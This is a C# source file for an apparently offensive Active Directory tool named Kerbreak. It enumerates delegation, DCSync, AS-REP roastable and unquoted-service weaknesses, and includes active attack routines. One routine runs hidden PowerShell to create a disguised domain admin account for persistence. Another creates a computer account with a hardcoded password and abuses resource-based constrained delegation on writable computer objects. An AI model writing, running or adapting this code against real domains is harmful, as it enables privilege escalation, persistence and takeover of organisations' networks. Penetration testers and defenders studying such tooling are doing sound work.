using System;
using Microsoft.Win32;
using System.Collections.Generic;
using System.DirectoryServices;
using System.IO;
using System.Reflection.PortableExecutable;
using System.ServiceProcess;
using System.Text;
using System.DirectoryServices.ActiveDirectory;
using System.Threading.Tasks;
using System.DirectoryServices.AccountManagement;
using Microsoft.AspNetCore.Authentication;
using System.Threading;
using System.Security.AccessControl;
using System.Collections;
using System.Security.Principal;
using System.Linq;

namespace KerberoShutdown
{
    class Kerbreak
    {

        public static void InitializeSearch()
        {
            Forest woods = Forest.GetCurrentForest();
            DomainCollection domains = woods.Domains;
            foreach (Domain domain in domains)
            {
                DisplayUtil.Print("\n[+] Enumeration for the Domain: " + domain.Name.ToString(), Enums.PrintColor.GREEN);
                DomainController dc = domain.FindDomainController();
                DisplayUtil.Print("[+] Domain Controller: " + dc.Name.ToString() + " ( DC-IP: " + dc.IPAddress.ToString() + ", OS: " + dc.OSVersion.ToString() + " )", Enums.PrintColor.GREEN);
                Console.WriteLine();
            }
        }

        public static void FindUnquotedsvc()
        {
            DisplayUtil.Print("[*] Searching for Unquoted Services. .", Enums.PrintColor.RED);
            Console.WriteLine();

            ServiceController[] scs = ServiceController.GetServices();
            foreach (ServiceController s in scs)
            {
                RegistryKey rkey = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\" + s.ServiceName);
                string path = rkey.GetValue("ImagePath").ToString();


                if (path[0] != '"' && !path.Contains("system32") && !path.Contains("System32"))
                {
                    Console.WriteLine(s.ServiceName);
                    Console.WriteLine(path);
                    Console.WriteLine();
                }
            }
        }

        public static void GetUnconstrainedDelegation()
        {
            DisplayUtil.Print("[*] Searching for Unonstrained Delegation accounts. .", Enums.PrintColor.RED);
            Console.WriteLine();

            //Fetching all domains
            Forest woods = Forest.GetCurrentForest();
            DomainCollection domains = woods.Domains;
            foreach (Domain domain in domains)
            {
                //Console.WriteLine(domain.Name);
                //pentest.local --> DC=pentest, DC=local
                string domainName = domain.Name.ToString();
                string[] dn = domainName.Split('.');

                for (int i = 0; i < dn.Length; i++)
                {
                    dn[i] = "DC=" + dn[i];

                }

                //LDAP://DC=pentest,DC=local
                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dn)));
                DirectorySearcher ds = new DirectorySearcher();
                List<string> Listflags = new List<string>();
                ds.SearchRoot = de;

                ds.Filter = "(&(objectclass=user)(useraccountcontrol>=524288))";

                try
                {
                    foreach (SearchResult sr in ds.FindAll())
                    {
                        //Console.WriteLine("Account Name: {0} ", sr.Properties["samaccountname"][0]);
                        //Console.WriteLine("UAC: {0} ", sr.Properties["useraccountcontrol"][0]);
                        int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);

                        string temp;
                        int count = 0;

                        foreach (KeyValuePair<string, int> entry in Enums.DictFlags)
                        {
                            if ((uac - entry.Value) >= 0)
                            {
                                uac -= entry.Value;
                                temp = entry.Key.ToLower();
                                if (temp.Contains("deleg"))
                                {
                                    if (count == 0)
                                    {
                                        DisplayUtil.Print("[+] Account Name: " + sr.Properties["samaccountname"][0], Enums.PrintColor.GREEN);
                                        count++;
                                    }
                                    Listflags.Add(entry.Key);
                                }
                            }
                        }

                        foreach (string f in Listflags)
                        {
                            Console.WriteLine("UAC flag: " + f);
                        }
                        Listflags.Clear();
                        Console.WriteLine();
                    }
                }
                catch { }
            }
        }

        internal static void HiddenAccountOnDC(string da, string password)
        {
            DisplayUtil.Print("[*] Let's Go! Create Hidden Domain Admin Account. .", Enums.PrintColor.RED);
            Console.WriteLine();
            DomainController dc = null;
            Forest woods = Forest.GetCurrentForest();
            DomainCollection domains = woods.Domains;
            foreach (Domain domain in domains)
            {
                dc = domain.FindDomainController();
            }

            string fake_da = da + "$";
            if (System.Net.Dns.GetHostName().ToString().ToLower().Contains(dc.Name.ToString().ToLower()))
            {
                try
                {
                    System.Diagnostics.Process process = new System.Diagnostics.Process();
                    System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                    startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                    startInfo.FileName = "powershell.exe";
                    startInfo.Arguments = "net user " + fake_da + " " + password + " /add /domain;net group \"Domain Admin Enterprise\" /add /domain;net group \"Domain Admin Enterprise\" " + fake_da + " /add;Add-ADGroupMember -Identity \"Domain Admins\" -Members \"Domain Admin Enterprise\";";
                    process.StartInfo = startInfo;
                    process.Start();
                    process.WaitForExit();
                }
                catch
                {
                    DisplayUtil.Print("\n[-] Failed: Something went wrong ", Enums.PrintColor.RED);
                }
            }
            else
            {
                DisplayUtil.Print("\n[-] Failed: this machine is not the Domain Controller ", Enums.PrintColor.RED);
                Environment.Exit(0);
            }
        }

        public static void GetConstrainedDelegation()
        {
            DisplayUtil.Print("[*] Searching for Constrained Delegation accounts. .", Enums.PrintColor.RED);
            Console.WriteLine();

            string temp;
            string temp2 ="";

            Forest woods = Forest.GetCurrentForest();
            DomainCollection domains = woods.Domains;
            foreach (Domain domain in domains)
            {
                //Console.WriteLine(domain.Name);
                //pentest.local --> DC=pentest, DC=local
                string domainName = domain.Name.ToString();
                string[] dn = domainName.Split('.');

                for (int i = 0; i < dn.Length; i++)
                {
                    dn[i] = "DC=" + dn[i];

                }

                //LDAP://DC=pentest,DC=local
                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dn)));
                DirectorySearcher ds = new DirectorySearcher();
                List<string> Listflags = new List<string>();
                ds.SearchRoot = de;

                ds.Filter = "(objectclass=user)";
                
                try
                {
                    foreach (SearchResult sr in ds.FindAll())
                    {
                        int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);
                        int count = 0;

                        if (sr.Properties["msds-allowedtodelegateto"].Count > 0)
                        {
                            foreach (KeyValuePair<string, int> entry in Enums.DictFlags)
                            {
                                if ((uac - entry.Value) >= 0)
                                {
                                    uac -= entry.Value;
                                    temp = entry.Key.ToLower();
                                    if (temp.Contains("deleg"))
                                    {
                                        if (count == 0)
                                        {
                                            DisplayUtil.Print("[+] Account Name: " + sr.Properties["samaccountname"][0], Enums.PrintColor.GREEN);
                                            count++;
                                            temp2 = temp;
                                        }
                                        Listflags.Add(entry.Key);
                                    }
                                }
                            }

                            if (temp2.Contains("deleg"))
                            {
                                Console.WriteLine();
                                Console.WriteLine("msds-allowedtodelegateto: ");
                                for (int i = 0; i < sr.Properties["msds-allowedtodelegateto"].Count; i++)
                                {
                                    Console.WriteLine(sr.Properties["msds-allowedtodelegateto"][i] + ",");
                                }

                                foreach (string f in Listflags)
                                {
                                    Console.WriteLine("UAC flag: " + f);
                                }
                                Listflags.Clear();
                                Console.WriteLine();

                            }

                            temp2 = "";
                        }
                    }
                }
                catch { }
            }
        }

        public static string CreateNewComputer(string domainname, string machinename)
        {
            string res = "";
            string[] dn = domainname.Split('.');

            for (int i = 0; i < dn.Length; i++)
            {
                dn[i] = "DC=" + dn[i];
            }

            try
            {
                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry("LDAP://CN=Computers," + String.Join(",", dn));
                System.DirectoryServices.DirectoryEntry computerobj = de.Children.Add("CN=" + machinename, "computer");
                computerobj.Properties["useraccountcontrol"].Value = 0x1000;
                computerobj.Properties["samaccountname"].Value = machinename + "$";
                computerobj.CommitChanges();

                string computerpass = "Passw0rd2.";
                computerobj.Invoke("SetPassword", computerpass);
                computerobj.CommitChanges();

                Console.WriteLine("Created computer account: {0} ", machinename + "$");
                Console.WriteLine("Password computer account: {0} ", computerpass);

                byte[] sid = (byte[])computerobj.Properties["objectsid"][0];
                SecurityIdentifier si = new SecurityIdentifier(sid, 0);

                Console.WriteLine("SID: {0}", si.ToString());

                res = si.ToString();
            }
            catch(Exception e)
            {
                res = e.Message;
            }
            
            return res;
        }
        
        public static string GetRandomName()
        {
            string res = "";
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            var random = new Random();

            char[] old = new char[10];

            for(int i = 0; i < 10; i++)
            {
                old[i] = chars[random.Next(10)];
            }
            res = new String(old);
            return res;
        }
        public static void RBCD(string domainName)
        {
            DisplayUtil.Print("[*] Searching for Resource-based Constrained Delegation accounts. .", Enums.PrintColor.RED);
            Console.WriteLine();
            string res="";
            StringWriter sw = new StringWriter();
            try {  
                string[] dn = domainName.Split('.');

                for (int i = 0; i < dn.Length; i++)
                {
                    dn[i] = "DC=" + dn[i];

                }

                //LDAP://DC=pentest,DC=local
                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dn)));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;

                //ds.Filter = "(objectclass=user)";

                SearchResult sr = ds.FindOne();
                try
                {
                    if (sr.Properties["ms-DS-MachineAccountQuota"][0].ToString() != null)
                    {
                        Console.WriteLine(sr.Path);
                        int computeraccountscancreate = Convert.ToInt32(sr.Properties["ms-DS-MachineAccountQuota"].Count);
                        if(computeraccountscancreate > 0)
                        {
                            sw.WriteLine("Number of computer account you can create: {0}", computeraccountscancreate);
                            sw.WriteLine();
                        }     
                    }

                    ds.Filter = "(objectclass=computer)";

                    string currentuser = WindowsIdentity.GetCurrent().Name;
                    // pentest\user2
                    currentuser = currentuser.Split('\\')[1];

                    foreach(SearchResult sr2 in ds.FindAll())
                    {
                        System.DirectoryServices.DirectoryEntry de2 = sr2.GetDirectoryEntry();
                        ActiveDirectorySecurity ads = de2.ObjectSecurity;
                        AuthorizationRuleCollection arc = ads.GetAccessRules(true, true, typeof(NTAccount));

                        foreach(ActiveDirectoryAccessRule ar in arc)
                        {
                            if (ar.IdentityReference.ToString().ToLower().Contains(currentuser.ToLower()))
                            {
                                if(ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericwrite") || ar.ActiveDirectoryRights.ToString().ToLower().Contains("genericall"))
                                {
                                    sw.WriteLine(sr2.Path);
                                    sw.WriteLine(ar.ActiveDirectoryRights);
                                    sw.WriteLine(ar.ActiveDirectoryRights);
                                    sw.WriteLine(ar.InheritanceFlags);

                                    //Create fake computer account
                                    string newsid = CreateNewComputer("domain", GetRandomName());
                                    string sddl = @"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + newsid + ")";
                                    RawSecurityDescriptor rs = new RawSecurityDescriptor(sddl);

                                    byte[] bytesid = new byte[sddl.Length];
                                    rs.GetBinaryForm(bytesid, 0);

                                    de2.Properties["msds-allowedtoactonbehalfofotheridentity"].Value = bytesid;
                                    de2.CommitChanges();

                                    sw.WriteLine("Set SID: {0} to {1} ", newsid, de2.Path);
                                }
                            }
                            sw.WriteLine();
                        }
                                
                    }
                }
                catch { }

                res = sw.ToString();
                Console.WriteLine(res);
            }
            catch
            {
            }
        }

        public string GetDCSyncUsers(string domainDN)
        {
            StringWriter sw = new StringWriter();

            Hashtable ht = new Hashtable();
            ht.Add("DS-Replication-Get-Changes", "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Get-Changes-All", "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Get-Changes-In-Filtered-Set", "89e95b76-444d-4c62-991a-0facbeda640c");
            ht.Add("DS-Replication-Manager-Topology", "1131f6ac-9c07-11d1-f79f-00c04fc2dcd2");
            ht.Add("DS-Replication-Monitor-Topology", "f98340fb-7c5b-4cdb-a00b-2ebdfa115a96");
            ht.Add("DS-Replication-Synchronize", "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2");

            System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry("LDAP://" + domainDN);
            DirectorySearcher ds = new DirectorySearcher();
            ds.SearchRoot = de;

            try
            {
                foreach (SearchResult sr in ds.FindAll())
                {
                    System.DirectoryServices.DirectoryEntry temp = sr.GetDirectoryEntry();
                    ActiveDirectorySecurity adpwn = temp.ObjectSecurity;

                    AuthorizationRuleCollection arc = adpwn.GetAccessRules(true, true, typeof(NTAccount));

                    if (domainDN.Contains(temp.Name))
                    {
                        sw.WriteLine("------------------------------------------");

                        foreach (ActiveDirectoryAccessRule a in arc)
                        {
                            foreach (DictionaryEntry d in ht)
                            {
                                if (d.Value.ToString() == a.ObjectType.ToString())
                                {
                                    sw.WriteLine(a.IdentityReference);
                                    //sw.WriteLine(a.ObjectType);
                                    sw.WriteLine(d.Key.ToString());
                                    //sw.WriteLine(a.ActiveDirectoryRights);
                                    sw.WriteLine("------------------------------------------");
                                    sw.WriteLine();
                                }
                            }
                        }
                    }

                }
            }
            catch { }

            return sw.ToString();
        }

        public static void DCSync()
        {
            DisplayUtil.Print("[*] Searching for DCSync accounts. .", Enums.PrintColor.RED);
            Console.WriteLine();

            string cmd = "";
            Forest f = Forest.GetCurrentForest();
            DomainCollection domains = f.Domains;
            foreach (Domain d in domains)
            {
                string domainName = d.Name.ToString();

                string[] dn = domainName.Split('.');
                for (int i = 0; i < dn.Length; i++)
                {
                    dn[i] = "DC=" + dn[i];
                }
                string domainDN = String.Join(",", dn);

                Kerbreak kerbreak = new Kerbreak();
                Thread dcsync = new Thread(() => { cmd += kerbreak.GetDCSyncUsers(domainDN); });
                dcsync.Start();
                dcsync.Join();
            }

            Console.WriteLine(cmd);
        }

        public static void GetWritableFiles(string root, string fileformat)
        {
            DisplayUtil.Print("[*] Searching for writable files. .", Enums.PrintColor.RED);
            Console.WriteLine();

            var dirs = Directory.EnumerateDirectories(root);
            foreach (string dir in dirs)
            {
                //Console.WriteLine(dir);
                try
                {
                    //Directory.EnumerateFiles(dir, "*.exe", SearchOption.AllDirectories);
                    var files = Directory.EnumerateFiles(dir, fileformat, SearchOption.AllDirectories);
                    foreach (string filename in files)
                    {
                        //Console.WriteLine(filename);
                        try
                        {
                            FileStream fs = File.Open(filename, FileMode.Open, FileAccess.ReadWrite);
                            Console.WriteLine("Write Access on {0} ", filename);
                            Console.WriteLine();
                        }
                        catch
                        {

                        }
                    }
                }
                catch
                {
                }
            }

        }

        public static void GetUACFlags(string username)
        {
            Options opt = new Options();
            opt.user = username;
            DisplayUtil.Print("[*] Searching all UAC flags of the user account " + opt.user + ". .", Enums.PrintColor.RED);
            Console.WriteLine();

            bool find = false;
            Forest woods = Forest.GetCurrentForest();
            DomainCollection domains = woods.Domains;
            foreach (Domain domain in domains)
            {
                //Console.WriteLine(domain.Name);
                //pentest.local --> DC=pentest, DC=local
                string domainName = domain.Name.ToString();
               
                string[] dn = domainName.Split('.');

                for (int i = 0; i < dn.Length; i++)
                {
                    dn[i] = "DC=" + dn[i];
                }

                //LDAP://DC=pentest,DC=local
                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dn)));
                DirectorySearcher ds = new DirectorySearcher();
                List<string> Listflags = new List<string>();
                ds.SearchRoot = de;

                ds.Filter = "(objectclass=user)";

                try
                {
                    foreach (SearchResult sr in ds.FindAll())
                    {
                        if (sr.Properties["samaccountname"][0].Equals(opt.user))
                        {
                            find = true;
                            DisplayUtil.Print("[+] Account Name: " + sr.Properties["samaccountname"][0], Enums.PrintColor.GREEN);
                            int uac = Convert.ToInt32(sr.Properties["useraccountcontrol"][0]);

                            foreach (KeyValuePair<string, int> entry in Enums.DictFlags)
                            {
                                if ((uac - entry.Value) >= 0)
                                {
                                    uac -= entry.Value;
                                    Listflags.Add(entry.Key);
                                }
                            }

                            Console.WriteLine();
                            foreach (string f in Listflags)
                            {
                                Console.WriteLine("UAC flag: " + f);
                            }
                        }
                    }
                    if (!find)
                        DisplayUtil.Print("\n[-] Invalid User ", Enums.PrintColor.RED);
                }
                catch {
                    DisplayUtil.Print("\n[-] Invalid User ", Enums.PrintColor.RED);
                } 
            }
        }

        public static void GetASREPRoastable()
        {
            DisplayUtil.Print("[*] Searching for AS-REP Roastable accounts. .", Enums.PrintColor.RED);
            Console.WriteLine();

            //Fetching all domains
            Forest woods = Forest.GetCurrentForest();
            DomainCollection domains = woods.Domains;
            foreach (Domain domain in domains)
            {
                //Console.WriteLine(domain.Name);
                //pentest.local --> DC=pentest,DC=local
                string domainName = domain.Name.ToString();
                string[] dn = domainName.Split('.');

                for (int i = 0; i < dn.Length; i++)
                {
                    dn[i] = "DC=" + dn[i];

                }

                //LDAP://DC=pentest,DC=local
                System.DirectoryServices.DirectoryEntry de = new System.DirectoryServices.DirectoryEntry(String.Format("LDAP://{0}", String.Join(",", dn)));
                DirectorySearcher ds = new DirectorySearcher();
                ds.SearchRoot = de;
                ds.Filter = "(&(objectclass=user)(!(objectclass=computer))(useraccountcontrol>=4194304))";
                foreach (SearchResult sr in ds.FindAll())
                {
                    Console.WriteLine("User: {0} from Domain: {1}", sr.Properties["samaccountname"][0], domainName);
                    Console.WriteLine("UserAccountControl: {0}", sr.Properties["useraccountcontrol"][0]);
                    Console.WriteLine();
                }

            }
        }

        public static void GetAllMembers(string groupName, string domainName)
        {
            DisplayUtil.Print("[*] Searching for all members of the group " + groupName + ". .", Enums.PrintColor.RED);
            Console.WriteLine();

            try
            {
                PrincipalContext pc = new PrincipalContext(ContextType.Domain, domainName);
                GroupPrincipal gp = GroupPrincipal.FindByIdentity(pc, groupName);

                foreach (Principal group in gp.GetMembers())
                {
                    if (group.StructuralObjectClass == "user")
                    {
                        Console.WriteLine("User: {0} ", group.Name);
                    }
                    else if (group.StructuralObjectClass == "group")
                    {
                        Console.WriteLine("Group: {0} is member of {1} ", group.Name, groupName);
                        GetAllMembers(group.Name, domainName);
                    }
                }
            }
            catch {
                DisplayUtil.Print("\n[-] Invalid Group Name or Domain Name", Enums.PrintColor.RED);
            }
        }
    }
}
